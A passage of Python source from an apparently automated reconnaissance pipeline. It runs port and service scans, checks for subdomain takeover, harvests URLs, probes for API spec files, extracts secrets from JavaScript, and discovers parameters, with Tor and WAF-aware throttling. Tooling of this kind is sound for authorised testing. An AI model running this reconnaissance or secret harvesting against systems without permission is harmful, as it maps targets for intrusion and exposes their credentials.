            sv_jobs.append((f"nmap-sv-{_safe_name(h)}", _sv_cmd, 600))
        if sv_jobs:
            await run_parallel(sv_jobs, outdir)
            # Merge all service gnmap files into services.txt
            sv_findings: List[str] = []
            for svp in sorted(outdir.glob("services_*.gnmap")):
                for ln in svp.read_text(encoding="utf-8", errors="ignore").splitlines():
                    if ln.startswith("Host:"):
                        # gnmap: Host: 1.2.3.4 () Ports: 80/open/tcp//http//Apache httpd 2.4.41///
                        sv_findings.append(ln.strip())
            if sv_findings:
                ensure(services_file).write_text("\n".join(sv_findings) + "\n")
                log("ok", f"04-SCAN: {len(sv_findings)} service detections → {services_file}")
            for svp in outdir.glob("services_*.gnmap"):
                svp.unlink(missing_ok=True)
    # If nmap was used instead of naabu, synthesize ports.txt from the
    # greppable output so downstream phases see a consistent artifact.
    if not ports_file.exists():
        gnmap = outdir / "ports.gnmap"
        if gnmap.exists():
            ports: Set[str] = set()
            for ln in gnmap.read_text(encoding="utf-8", errors="ignore").splitlines():
                if not ln.startswith("Host:"):
                    continue
                # gnmap line: Host: 1.2.3.4 () Ports: 80/open/tcp//http/// ...
                head, _, ports_part = ln.partition("Ports:")
                ip = head.split()[1] if len(head.split()) > 1 else ""
                for entry in ports_part.split(","):
                    bits = entry.strip().split("/")
                    if len(bits) >= 3 and bits[1] == "open":
                        ports.add(f"{ip}:{bits[0]}")
            if ports:
                ensure(ports_file).write_text("\n".join(sorted(ports)) + "\n")
    raw_hosts = outdir / "hosts.txt"
    targets = outdir / "host_targets.txt"
    if raw_hosts.exists() and read_lines(raw_hosts):
        _write_target_tokens(raw_hosts, targets)
        _parse_httpx_tech(raw_hosts, outdir / "tech.txt")
    elif have_hosts:
        _write_target_tokens(hosts, targets)
    return _existing_artifacts({
        "04-SCAN.ports": str(ports_file),
        "04-SCAN.hosts": str(raw_hosts),
        "04-SCAN.targets": str(targets),
        "04-SCAN.takeover": str(outdir / "takeover.txt"),
    })


async def phase_04b_TAKEOVER_VALIDATE(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False,
) -> Dict[str, Any]:
    if skip & {"04b-TAKEOVER-VALIDATE"}:
        return {}
    if only and "04b-TAKEOVER-VALIDATE" not in only:
        return {}
    _out = outdir / "takeover_confirmed.txt"
    if _out.exists() and not force:
        return {"04b-TAKEOVER-VALIDATE": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 04b-TAKEOVER-VALIDATE: confirm dangling CNAME takeover candidates")
    findings: List[str] = []
    _tv_urlopen = _get_urlopener()
    _tv_extra_headers = _extra_headers_dict()
    takeover_sources = [
        outdir / "takeover.txt",
        outdir / "takeover_dns.txt",
    ]
    candidates: List[str] = []
    for src in takeover_sources:
        if src.exists():
            for ln in read_lines(src):
                ln = ln.strip()
                if not ln:
                    continue
                # Strip extra metadata nuclei may append:  URL [type] [cname]
                url = ln.split()[0] if ln.split() else ln
                if url and (url.startswith("http://") or url.startswith("https://") or "." in url):
                    candidates.append(url)
    candidates = _dedupe_by_host_path(candidates)
    if not candidates:
        log("warn", "04b-TAKEOVER-VALIDATE: no takeover candidates found; skipping")
        return {"04b-TAKEOVER-VALIDATE": str(_out), "count": 0}
    findings.append(f"candidates_found={len(candidates)}")
    for cand in candidates[:_PIPELINE_CFG.sample_urls_fuzz]:
        await _throttle_rate()
        try:
            cand = cand.strip()
            if cand.startswith("http://") or cand.startswith("https://"):
                url = cand
            else:
                url = f"http://{cand}"
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0", **_tv_extra_headers})
            status, headers, body_bytes = await _async_urlopen(_tv_urlopen, req, timeout=10)
            body = body_bytes.decode("utf-8", errors="ignore").lower()
            # Common takeover signatures: 404, NXDOMAIN, "no such bucket", "404 not found", etc.
            takeover_indicators = [
                "no such bucket", "does not exist", "not found", "repository not found",
                "there is no site", "no such app", "404 blog not found", "please configure",
                "this page is not available", "the page you are looking for is not here",
                "this site is not configured", "account not found", "this user's page",
                "is not currently accepting", "there is nothing here for you",
            ]
            if status == 404 or any(ind in body for ind in takeover_indicators):
                findings.append(f"[confirmed] {cand} → HTTP {status} (likely vulnerable)")
                if "server" in headers:
                    findings.append(f"  server={headers['server']}")
            elif status in (200, 301, 302):
                findings.append(f"[potential] {cand} → HTTP {status} (check manually)")
            else:
                findings.append(f"[checked] {cand} → HTTP {status} (not vulnerable)")
        except Exception as e:
            findings.append(f"[error] {cand} → {e}")
    if not any(f.startswith("[confirmed]") for f in findings):
        findings.append("[result] No confirmed takeover vulnerabilities detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"04b-TAKEOVER-VALIDATE: {len(findings)} findings → {out}")
    return {"04b-TAKEOVER-VALIDATE": str(_out), "count": len(findings)}


async def phase_05_HARVEST(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"05-HARVEST"}:
        return {}
    if only and "05-HARVEST" not in only:
        return {}
    _c1_out = outdir / "urls_all.txt"
    if _c1_out.exists() and not force:
        return {"05-HARVEST": str(_c1_out), "count": count_nonblank(_c1_out)}
    log("info", "Phase 05-HARVEST: URL harvesting (parallel groups)")

    async def _c1_resolve_hosts() -> Optional[Path]:
        h = Path(prev.get("04-SCAN.targets") or outdir / "host_targets.txt")
        h_ok = h.exists() and bool(read_lines(h))
        if not h_ok:
            h = Path(prev.get("04-SCAN.hosts") or outdir / "hosts.txt")
            h_ok = h.exists() and bool(read_lines(h))
        if h_ok and h.name == "hosts.txt":
            normalized = outdir / "host_targets.txt"
            # Only normalize if destination doesn't exist yet (04-SCAN already
            # produced host_targets.txt from the same hosts.txt in its phase).
            if not normalized.exists():
                _write_target_tokens(h, normalized)
            h = normalized
        if not h.exists() or not bool(read_lines(h)):
            h = Path(prev.get("02-RESOLVE") or outdir / "resolved.txt")
        if h.exists() and bool(read_lines(h)):
            return h
        return None

    hosts = await _c1_resolve_hosts()
    if hosts is None:
        log("warn", "05-HARVEST: no host input; skipping")
        return {}
    waf_detected = getattr(_PIPELINE_CFG, 'waf_detected', False)
    if waf_detected:
        log("info", "05-HARVEST: WAF detected, reducing crawler depth/concurrency")
    g1: List[Tuple[str, List[str], int]] = []
    # gau doesn't support -l for file input; use per-host loop.
    if t.has("gau"):
        runner = outdir / "logs" / "gau_runner.sh"
        ensure(runner)
        _gau_rl = _rate_limit_args("gau")
        _gau_threads = "2"
        _gau_parallel = "2"
        if _gau_rl:
            for i, a in enumerate(_gau_rl):
                if a == "--threads" and i + 1 < len(_gau_rl):
                    _gau_threads = _gau_rl[i + 1]
                    _gau_parallel = _gau_threads
        runner.write_text(
            "#!/usr/bin/env bash\n"
            "set -u\n"
            f"OUT={shlex.quote(str(outdir / 'urls_gau.txt'))}\n"
            f"IN={shlex.quote(str(hosts))}\n"
            ': > "$OUT"\n'
            'TMPDIR=$(mktemp -d) || exit 1\n'
            'trap "rm -rf \'$TMPDIR\'" EXIT\n'
            'export TMPDIR\n'
            f'xargs -r -P {_gau_parallel} -I{{}} sh -c '
            f'\'timeout 300 gau --subs --threads {_gau_threads} '
            '--blacklist ttf,woff,svg,png,jpg,gif,ico,css "$1" '
            '> "$TMPDIR/$(echo "$1" | md5sum | cut -d" " -f1).txt"\' _ {{}} < "$IN"\n'
            'cat "$TMPDIR"/*.txt >> "$OUT" || true\n'
        )
        runner.chmod(0o700)
        g1.append(("gau", ["bash", str(runner)], _maybe_timeout(3600)))

    if t.has("gospider"):
        # gospider's -o is an output *folder* (one file per site), not a file,
        # so we don't use it: run via a runner that captures stdout and extracts
        # the URL token from each line into a flat urls_gospider.txt.
        # Over Tor (proxychains) or WAF, reduce concurrency and depth to avoid hanging.
        _gs_threads = 1 if (_USE_PROXYCHAINS or waf_detected) else 3
        _gs_depth = 1 if (_USE_PROXYCHAINS or waf_detected) else 3
        runner = outdir / "logs" / "gospider_runner.sh"
        ensure(runner)
        runner.write_text(
            "#!/usr/bin/env bash\n"
            "set -eu\n"
            f"OUT={shlex.quote(str(outdir / 'urls_gospider.txt'))}\n"
            f"IN={shlex.quote(str(hosts))}\n"
            f'gospider -q -t {_gs_threads} -d {_gs_depth} -S "$IN" 2>/dev/null '
            '| grep -oE \'https?://[^[:space:]"]+\' | sort -u > "$OUT"\n'
        )
        runner.chmod(0o700)
        g1.append(("gospider", ["bash", str(runner)], _maybe_timeout(1800)))
    g2: List[Tuple[str, List[str], int]] = []
    if t.has("katana"):
        _katana_proxy = []
        if _PIPELINE_CFG.proxy:
            _katana_proxy = ["-proxy", _PIPELINE_CFG.proxy]
        _katana_depth = "1" if waf_detected else "3"
        g2.append(
            (
                "katana",
                [
                    "katana",
                    "-silent",
                    "-list",
                    str(hosts),
                    "-o",
                    str(outdir / "urls_katana.txt"),
                    "-jc",
                    "-d",
                    _katana_depth,
                    "-duc",
                ] + _katana_proxy + _extra_http_args() + _rate_limit_args("katana"),
                _maybe_timeout(900) if waf_detected else _maybe_timeout(1800),
            )
        )
    if t.has("subjs"):
        runner = outdir / "logs" / "subjs_runner.sh"
        ensure(runner)
        runner.write_text(
            "#!/usr/bin/env bash\n"
            "set -eu\n"
            f"OUT={shlex.quote(str(outdir / 'urls_subjs.txt'))}\n"
            f"IN={shlex.quote(str(hosts))}\n"
            ': > "$OUT"\n'
            'subjs -i "$IN" > "$OUT"\n'
        )
        runner.chmod(0o700)
        g2.append(("subjs", ["bash", str(runner)], _maybe_timeout(1200)))
    # waymore — modern URL harvester combining gau/wayback/crtsh with caching
    if t.has("waymore"):
        g2.append(
            (
                "waymore",
                [
                    "waymore", "-i", str(hosts), "-mode", "U",
                    "-oU", str(outdir / "urls_waymore.txt"),
                    "-oR", str(outdir / "logs" / "waymore"),
                ],
                _maybe_timeout(1800),
            )
        )
    all_g = g1 + g2
    if all_g:
        await run_parallel(all_g, outdir)
    harvested = [
        outdir / "urls_gau.txt",
        outdir / "urls_gospider.txt",
        outdir / "urls_katana.txt",
        outdir / "urls_subjs.txt",
        outdir / "urls_waymore.txt",
    ]
    if not any(p.exists() and read_lines(p) for p in harvested):
        log("warn", "05-HARVEST: no URL harvesters produced output")
    n = merge_unique(harvested, outdir / "urls_all.txt")
    log("ok", f"05-HARVEST: {n} unique URLs")
    # Feed new hosts discovered via URL harvesting back into host_targets.txt
    # so downstream scanning phases can test them too.
    urls_file = outdir / "urls_all.txt"
    targets_file = outdir / "host_targets.txt"
    if urls_file.exists() and read_lines(urls_file):
        existing_hosts: Set[str] = set()
        if targets_file.exists():
            for ln in read_lines(targets_file):
                ln = ln.strip().rstrip("/")
                if ln:
                    existing_hosts.add(ln)
        new_hosts: Set[str] = set()
        for u in read_lines(urls_file):
            u = u.strip().rstrip("/")
            if not u:
                continue
            try:
                parsed = urllib.parse.urlparse(u)
                netloc = parsed.netloc or parsed.path.split("/")[0]
                if netloc:
                    hostname = netloc.split(":")[0]
                    if hostname and _is_valid_hostname(hostname) and hostname not in existing_hosts:
                        new_hosts.add(f"https://{netloc}" if parsed.scheme in ("http", "https") else u)
            except Exception:
                pass
        if new_hosts:
            log("info", f"05-HARVEST: {len(new_hosts)} new hosts from URLs (probing...)")
            tmp = outdir / ".harvest_new_hosts.txt"
            tmp.write_text("\n".join(sorted(new_hosts)) + "\n")
            if t.has("httpx"):
                httpx_out = outdir / ".harvest_new_probed.txt"
                await _run(
                    "httpx-harvest",
                    ["httpx", "-silent", "-l", str(tmp), "-o", str(httpx_out),
                     "-title", "-tech-detect", "-status-code", "-follow-redirects"]
                    + _extra_http_args() + _rate_limit_args("httpx"),
                    _maybe_timeout(600), outdir,
                )
                if httpx_out.exists() and read_lines(httpx_out):
                    merge_unique([httpx_out], targets_file)
                    merge_unique([httpx_out], outdir / "hosts.txt")
                    httpx_out.unlink(missing_ok=True)
                    log("ok", f"05-HARVEST: added {len(read_lines(targets_file)) - len(existing_hosts)} new target hosts")
            tmp.unlink(missing_ok=True)
    return {"05-HARVEST": str(outdir / "urls_all.txt"), "count": n}


async def phase_05b_APISPEC(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False, domain: str = "",
) -> Dict[str, Any]:
    if skip & {"05b-APISPEC"}:
        return {}
    if only and "05b-APISPEC" not in only:
        return {}
    _out = outdir / "api_specs.txt"
    if _out.exists() and not force:
        return {"05b-APISPEC": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 05b-APISPEC: hunt API spec files (swagger, openapi, graphql SDL)")
    findings: List[str] = []
    _ap_urlopen = _get_urlopener()
    _ap_extra_headers = _extra_headers_dict()
    # Collect unique hosts from HARVEST output
    hosts_file = outdir / "hosts.txt"
    urls_file = outdir / "urls_all.txt"
    hosts: Set[str] = set()
    if hosts_file.exists():
        for h in read_lines(hosts_file):
            h = h.strip().rstrip("/")
            if h:
                hosts.add(h)
    if urls_file.exists():
        for u in read_lines(urls_file):
            u = u.strip().rstrip("/")
            if u:
                parsed = urllib.parse.urlparse(u)
                netloc = parsed.netloc or parsed.path.split("/")[0]
                if netloc:
                    hosts.add(f"{parsed.scheme}://{netloc}" if parsed.scheme else f"http://{netloc}")
    if not hosts:
        log("warn", "05b-APISPEC: no hosts found; skipping")
        return {"05b-APISPEC": str(_out), "count": 0}
    # Filter hosts to only those in-scope for the target domain
    if domain:
        host_domain = domain.lower().lstrip("*.")
        in_scope: Set[str] = set()
        for h in hosts:
            if "://" in h:
                hostname = h.lower().split("/")[2].split(":")[0]
                if host_domain in hostname:
                    in_scope.add(h)
        dropped = len(hosts) - len(in_scope)
        if dropped:
            log("info", f"05b-APISPEC: dropped {dropped} out-of-scope host(s)")
        hosts = in_scope
    findings.append(f"target_hosts={len(hosts)}")
    api_paths = [
        "/swagger.json", "/swagger/v1/swagger.json", "/swagger/v2/swagger.json",
        "/api/swagger.json", "/api/v1/swagger.json", "/api/v2/swagger.json",
        "/openapi.json", "/openapi.yaml", "/openapi.yml",
        "/api/openapi.json", "/api/openapi.yaml",
        "/api-docs", "/api/v1/api-docs", "/api/v2/api-docs",
        "/v1/api-docs", "/v2/api-docs",
        "/graphql", "/graphql?sdl", "/v1/graphql", "/v2/graphql",
        "/graph/schema.graphql", "/graphql/schema.json",
        "/.well-known/openid-configuration",
    ]
    _probe_sem = asyncio.Semaphore(20)
    async def _probe_one(base: str, path: str) -> Optional[str]:
        async with _probe_sem:
            await _throttle_rate()
            url = f"{base}{path}"
            try:
                req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0", **_ap_extra_headers})
                status, headers, body_bytes = await _async_urlopen(_ap_urlopen, req, timeout=10)
                body = body_bytes.decode("utf-8", errors="ignore")
                if status in (200, 301, 302) and len(body) > 50:
                    if "swagger" in body.lower() or path.endswith("swagger.json"):
                        try:
                            data = json.loads(body)
                            if "paths" in data:
                                endpoints = list(data["paths"].keys())
                                lines = [f"[swagger] {url} → {len(endpoints)} endpoints"]
                                lines += [f"  {ep}" for ep in endpoints[:20]]
                                return "\n".join(lines)
                        except json.JSONDecodeError:
                            return f"[swagger] {url} (unparseable JSON)"
                    elif "openapi" in body.lower() or path.endswith(("openapi.yaml", "openapi.yml", "openapi.json")):
                        try:
                            data = json.loads(body)
                            if "paths" in data:
                                endpoints = list(data["paths"].keys())
                                lines = [f"[openapi] {url} → {len(endpoints)} endpoints"]
                                lines += [f"  {ep}" for ep in endpoints[:20]]
                                return "\n".join(lines)
                        except json.JSONDecodeError:
                            return f"[openapi] {url} (unparseable JSON)"
                    elif "graphql" in body.lower() or "sdl" in path:
                        lines = [f"[graphql-sdl] {url} → {len(body[:500].splitlines())} lines"]
                        for ln in body[:1000].splitlines()[:10]:
                            lines.append(f"  {ln[:120]}")
                        return "\n".join(lines)
                    elif "id_token" in body or "jwks_uri" in body or "authorization_endpoint" in body:
                        return f"[oidc] {url} (OpenID Connect configuration)"
                    else:
                        return f"[api-spec] {url} → HTTP {status} ({len(body)} bytes)"
            except Exception:
                return None
    host_list = sorted(hosts)[:_PIPELINE_CFG.sample_urls_apisec]
    tasks = [_probe_one(h.rstrip("/") if h.startswith("http") else f"https://{h.rstrip('/')}", p) for h in host_list for p in api_paths]
    probe_results = await asyncio.gather(*tasks)
    findings.extend(r for r in probe_results if r)
    if not findings or len(findings) == 1:
        findings.append("[result] No API spec files discovered")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"05b-APISPEC: {len(findings)} findings → {out}")
    return {"05b-APISPEC": str(_out), "count": len(findings)}


async def phase_06_JSINTEL(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, domain: str = "", force: bool = False) -> Dict[str, Any]:
    if skip & {"06-JSINTEL"}:
        return {}
    if only and "06-JSINTEL" not in only:
        return {}
    _c2_out = outdir / "js_secrets.txt"
    if _c2_out.exists() and not force:
        return {"06-JSINTEL": str(_c2_out), "count": count_nonblank(_c2_out)}
    log("info", "Phase 06-JSINTEL: JS analysis (SecretFinder + nuclei)")
    urls = outdir / "urls_all.txt"
    js_urls = outdir / "urls_js.txt"
    map_urls = outdir / "urls_sourcemap.txt"
    xnlink_out = outdir / "urls_xnlink.txt"
    # Collect JS URLs and source-map URLs from the harvested pool.
    # Strip query/fragment to check extension; keep the full original URL.
    if urls.exists():
        keep_js: List[str] = []
        keep_map: List[str] = []
        seen_js: Set[str] = set()
        seen_map: Set[str] = set()
        for u in read_lines(urls):
            path = u.split("?", 1)[0].split("#", 1)[0].lower()
            if path.endswith((".js", ".jsx", ".mjs", ".cjs", ".ts", ".tsx")):
                if u not in seen_js:
                    seen_js.add(u)
                    keep_js.append(u)
            if path.endswith(".map") and u not in seen_map:
                seen_map.add(u)
                keep_map.append(u)
        if keep_js:
            ensure(js_urls).write_text("\n".join(keep_js) + "\n")
            log("ok", f"06-JSINTEL: collected {len(keep_js)} JS/TS URLs")
        if keep_map:
            ensure(map_urls).write_text("\n".join(keep_map) + "\n")
            log("ok", f"06-JSINTEL: collected {len(keep_map)} source-map URLs")
    if not js_urls.exists() or not read_lines(js_urls):
        log("info", "06-JSINTEL: no JS URLs found; skipping")
        ensure(outdir / "js_secrets.txt").write_text("")
        return {"06-JSINTEL": str(outdir / "js_secrets.txt"), "count": 0}
    # When running over proxychains/Tor, downsample JS URLs so
    # tools don't time out (each URL fetch is slow).
    _js_input = js_urls
    if _USE_PROXYCHAINS:
        js_lines = read_lines(js_urls)
        if len(js_lines) > 100:
            sampled = js_lines[:100]
            _js_input = outdir / "urls_js_sample.txt"
            ensure(_js_input).write_text("\n".join(sampled) + "\n")
            log("info", f"06-JSINTEL: downsampled {len(js_lines)} JS URLs to {len(sampled)} for slow network")

    jobs: List[Tuple[str, List[str], int]] = []
    if t.has("secretfinder"):
        # SecretFinder's -i flag expects a single URL, not a file.
        # Iterate over each JS URL so individual requests are not
        # misinterpreted as file-path HTTP fetches.
        runner = outdir / "logs" / "secretfinder_runner.sh"
        ensure(runner)
        runner.write_text(
            "#!/usr/bin/env bash\n"
            "set -u\n"
            f"OUT={shlex.quote(str(outdir / 'secrets.txt'))}\n"
            f"IN={shlex.quote(str(_js_input))}\n"
            ': > "$OUT"\n'
            'TMPDIR=$(mktemp -d) || exit 1\n'
            'trap "rm -rf \'$TMPDIR\'" EXIT\n'
            'export TMPDIR\n'
            'xargs -r -P 2 -I{} sh -c '
            '\'echo "[06-JSINTEL] secretfinder $1" >&2; '
              'timeout 120 secretfinder -i "$1" -o cli > '
             '"$TMPDIR/$(echo "$1" | md5sum | cut -d" " -f1).txt"\' _ {} < "$IN"\n'
             'cat "$TMPDIR"/*.txt >> "$OUT" || true\n'
        )
        runner.chmod(0o700)
        jobs.append(("secretfinder", ["bash", str(runner)], _maybe_timeout(3600)))

    if t.has("nuclei"):
        _nuc_proxy = []
        if _PIPELINE_CFG.proxy:
            _nuc_proxy = ["-proxy", _PIPELINE_CFG.proxy]
        # Cap input at 50 URLs for nuclei-exposures to avoid 30+ min hangs
        _nuc_exposure_input = _js_input
        _nuc_js_lines = read_lines(_js_input) if _js_input.exists() else []
        if len(_nuc_js_lines) > 50:
            _nuc_exposure_input = outdir / "urls_js_nuclei_sample.txt"
            ensure(_nuc_exposure_input).write_text("\n".join(_nuc_js_lines[:50]) + "\n")
            log("info", f"06-JSINTEL: capped nuclei-exposures input to 50 URLs (from {len(_nuc_js_lines)})")
        jobs.append(
            (
                "nuclei-exposures",
                [
                    "nuclei",
                    "-silent",
                    "-l",
                    str(_nuc_exposure_input),
                    "-t",
                    "http/exposed-panels",
                    "-t",
                    "http/exposures",
                    "-timeout", "30", "-max-time", "60", "-max-host-error", "10",
                    "-o",
                    str(outdir / "nuclei_exposures.txt"),
                ] + _extra_http_args() + _nuc_proxy + _rate_limit_args("nuclei"),
                min(_maybe_timeout(900), 1800),
            )
        )
    if t.has("xnLinkFinder"):
        jobs.append(
            (
                "xnlinkfinder",
                [
                    "xnLinkFinder",
                    "-i", str(_js_input),
                    "-o", str(xnlink_out),
                    "-sf", domain,
                    "-d", "1",
                    "-p", "10",
                    "-t", "30",
                    "-inc",
                    "-nb",
                    "-ow",
                ] + _extra_http_args(),
                _maybe_timeout(1800),
            )
        )
    if jobs:
        await run_parallel(jobs, outdir)
    # Filter false positives from SecretFinder output
    secrets_file = outdir / "secrets.txt"
    if secrets_file.exists() and read_lines(secrets_file):
        filtered: List[str] = []
        fp_placeholder = re.compile(
            r'(?i)^0{8}-0{4}-0{4}-0{4}-0{12}$'  # all-zero UUID
            r'|^f{8}-f{4}-f{4}-f{4}-f{12}$'  # all-F UUID
            r'|^D27CDB6E-AE6D-11cf-96B8-444553540000$'  # known test GUID
            r'|^[0]+$|^[f]+$|^-?1+$'  # all-zeros, all-F's, all-ones
        )
        fp_month_patterns = re.compile(
            r'(?i)(january|february|march|april|may|june|july|august|september|october|november|december'
            r'|jan|feb|mar|apr|may|jun|jul|aug|sep|oct|nov|dec'
            r'|apple-mobile-web-app|getGlobalThis|classCallCheck|defineProperty|setPrototypeOf'
            r'|toPropertyKey|possibleConstructorReturn|assertThisInitialized)'
        )
        for ln in read_lines(secrets_file):
            parts = ln.split("\t->\t", 1)
            if len(parts) == 2:
                secret_value = parts[1].strip().strip('"').strip("'")
                # Skip placeholder/dummy values (UUIDs, all-zeros, test GUIDs)
                if fp_placeholder.search(secret_value):
                    continue
                # Skip lines where the "secret" value is a known i18n/month false positive
                if len(secret_value) < 16 and fp_month_patterns.search(secret_value):
                    continue
                # Skip single words under 16 chars that look like i18n fragments
                if len(secret_value) < 16 and " " not in secret_value and "_" not in secret_value:
                    continue
            filtered.append(ln)
        if len(filtered) < len(read_lines(secrets_file)):
            log("info", f"06-JSINTEL: filtered {len(read_lines(secrets_file)) - len(filtered)} SecretFinder false positives")
            secrets_file.write_text("\n".join(filtered) + ("\n" if filtered else ""))
    if xnlink_out.exists() and read_lines(xnlink_out):
        merge_unique(
            [xnlink_out],
            outdir / "urls_all.txt",
        )
    # Collect .json endpoints from JS tool outputs and the full URL pool
    json_urls = outdir / "urls_json.txt"
    json_keep: List[str] = []
    json_seen: Set[str] = set()
    for src in [xnlink_out, outdir / "secrets.txt"]:
        if src and src.exists():
            for u in read_lines(src):
                path = u.split("?", 1)[0].split("#", 1)[0].lower()
                if path.endswith(".json") and u not in json_seen:
                    json_seen.add(u)
                    json_keep.append(u)
    if urls.exists():
        for u in read_lines(urls):
            path = u.split("?", 1)[0].split("#", 1)[0].lower()
            if path.endswith(".json") and u not in json_seen:
                json_seen.add(u)
                json_keep.append(u)
    if json_keep:
        ensure(json_urls).write_text("\n".join(json_keep) + "\n")
        log("ok", f"06-JSINTEL: collected {len(json_keep)} JSON API endpoints")
    # Merge JSON endpoints back so downstream phases see API surface
    if json_urls.exists() and read_lines(json_urls):
        merge_unique(
            [json_urls],
            outdir / "urls_all.txt",
        )
    n = merge_unique(
        [outdir / "secrets.txt", outdir / "nuclei_exposures.txt"],
        outdir / "js_secrets.txt",
    )
    if n == 0:
        log("warn", "06-JSINTEL: no JS findings produced")
        ensure(outdir / "js_secrets.txt").write_text("")
    return {"06-JSINTEL": str(outdir / "js_secrets.txt"), "count": n}


async def phase_07_PARAMS(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"07-PARAMS"}:
        return {}
    if only and "07-PARAMS" not in only:
        return {}
    _d_out = outdir / "params.txt"
    if _d_out.exists() and not force:
        return {"07-PARAMS": str(_d_out), "count": count_nonblank(_d_out)}
    log("info", "Phase 07-PARAMS: parameter discovery")
    # Clean up stale normalized output from prior runs so it doesn't
    # leak into the fresh merge on forced re-runs when arjun fails.
    for old in outdir.glob("params_*.txt"):
        if old.name != "params.txt":
            old.unlink(missing_ok=True)
    # Also nuke old arjun JSON so a failed forced re-run doesn't
    # silently reuse stale results from a previous successful run.
    if force:
        (outdir / "params_arjun.json").unlink(missing_ok=True)
    urls = outdir / "urls_all.txt"
    if not urls.exists() or not read_lines(urls):
        log("warn", "07-PARAMS: no URLs; skipping")
        return {"07-PARAMS": str(outdir / "params.txt"), "count": 0}
    _d_urls = _dedupe_by_host_path(read_lines(urls))
    jobs: List[Tuple[str, List[str], int]] = []
    # arjun writes JSON. We capture the JSON and normalize to one URL per
    # line in the .txt sibling below. Over Tor this is very slow — sample URLs.
    arjun_had_input = False
    if t.has("arjun"):
        arjun_in = ensure(outdir / "urls_arjun_sample.txt")
        waf_detected = _PIPELINE_CFG.waf_detected
        sample_size = min(_PIPELINE_CFG.sample_urls_params, _PIPELINE_CFG.sample_urls_arjun_waf) if waf_detected else _PIPELINE_CFG.sample_urls_params
        arjun_urls = _d_urls[:sample_size]
        if arjun_urls:
            arjun_had_input = True
            arjun_in.write_text("\n".join(arjun_urls) + "\n")
            _arjun_parts = [
                "arjun", "-i", str(arjun_in), "-o", str(outdir / "params_arjun.json"),
                "-T", "60", "--rate-limit", "50",
                "--disable-redirects",
            ]
            _arjun_headers = _extra_headers_dict()
            if _arjun_headers:
                _arjun_parts += ["--headers", "\n".join(f"{k}: {v}" for k, v in _arjun_headers.items())]
            timeout = _maybe_timeout(600) if waf_detected else _maybe_timeout(1800)
            # Check for known arjun version bug (v2.2.7 on Python 3.12)
            _arjun_broken = False
            try:
                _arjun_ver = subprocess.run(["arjun", "--version"], capture_output=True, text=True, timeout=10)
                if "2.2.7" in _arjun_ver.stdout:
                    log("warn", "arjun 2.2.7 has a known bug on Python 3.12 (AttributeError: 'dict' object has no attribute 'status_code'); consider pinning to 2.2.6 with: pip install arjun==2.2.6")
                    _arjun_broken = True
            except Exception:
                pass
            if not _arjun_broken:
                jobs.append(("arjun", _arjun_parts, timeout))
            else:
                log("warn", "07-PARAMS: skipping arjun due to known bug in installed version")
            if waf_detected and sample_size < _PIPELINE_CFG.sample_urls_params:
                log("info", f"07-PARAMS: WAF detected, reduced arjun sample to {sample_size} URLs with {timeout}s timeout")
    if jobs:
        await run_parallel(jobs, outdir)
    # Normalize arjun JSON output to plain URL-per-line text.
    raw = outdir / "params_arjun.json"
    if raw.exists():
        norm = raw.with_suffix(".txt")
        urls_found: List[str] = []
        data = None
        try:
            data = json.loads(raw.read_text(encoding="utf-8", errors="ignore"))
        except json.JSONDecodeError:
            data = None
        # arjun output: { "https://url?q=1": {"parameters": [...]} }
        # or list of objects
        if isinstance(data, dict):
            for k, v in data.items():
                if isinstance(k, str) and (k.startswith("http://") or k.startswith("https://")):
                    urls_found.append(k)
        elif isinstance(data, list):
            for item in data:
                if isinstance(item, dict) and isinstance(item.get("url"), str):
                    urls_found.append(item["url"])
        # JSONL fallback
        if not urls_found:
            for rec in read_jsonl(raw):
                if isinstance(rec, dict) and rec.get("url"):
                    urls_found.append(str(rec["url"]))
        if not urls_found:
            reason = "likely blocked by WAF" if _PIPELINE_CFG.waf_detected else "arjun produced no results"
            log("warn", f"07-PARAMS: {reason}")
        ensure(norm).write_text("\n".join(urls_found) + ("\n" if urls_found else ""))
    elif arjun_had_input:
        log("warn", "07-PARAMS: arjun produced no output file; retrying with smaller sample")
        retry_sample = arjun_urls[:3]
        if retry_sample:
            retry_in = ensure(outdir / "urls_arjun_retry.txt")
            retry_in.write_text("\n".join(retry_sample) + "\n")
            retry_parts = [
                "arjun", "-i", str(retry_in), "-o", str(outdir / "params_arjun.json"),
                "-T", "120", "--rate-limit", "50", "--disable-redirects",
            ]
            await run_parallel([("arjun-retry", retry_parts, _maybe_timeout(600))], outdir)
            if not (outdir / "params_arjun.json").exists():
                log("warn", "07-PARAMS: arjun retry also produced no output file")
    # Glob params_*.txt but EXCLUDE the params.txt we are about to write.
    parts = sorted(p for p in outdir.glob("params_*.txt") if p.name != "params.txt")
    n = merge_unique(parts, outdir / "params.txt")
    return {"07-PARAMS": str(outdir / "params.txt"), "count": n}


async def phase_08_FUZZ(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False) -> Dict[str, Any]:
    if skip & {"08-FUZZ"}:
        return {}
    _f_out = outdir / "fuzz.txt"
    if _f_out.exists() and not force:
        return {"08-FUZZ": str(_f_out), "count": count_nonblank(_f_out)}
    log("info", "Phase 08-FUZZ: fuzzing")
    _ffuf_dir = outdir / "ffuf"
    _ffuf_dir.mkdir(parents=True, exist_ok=True)
    # Clean stale ffuf files from root outdir (pre-migration leftovers)
    for stale in outdir.glob("ffuf_*.txt"):
        stale.unlink(missing_ok=True)
    for stale in outdir.glob("ffuf_*.json"):
        stale.unlink(missing_ok=True)
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "08-FUZZ: no URLs; skipping")
        return {"08-FUZZ": str(outdir / "fuzz.txt"), "count": 0}
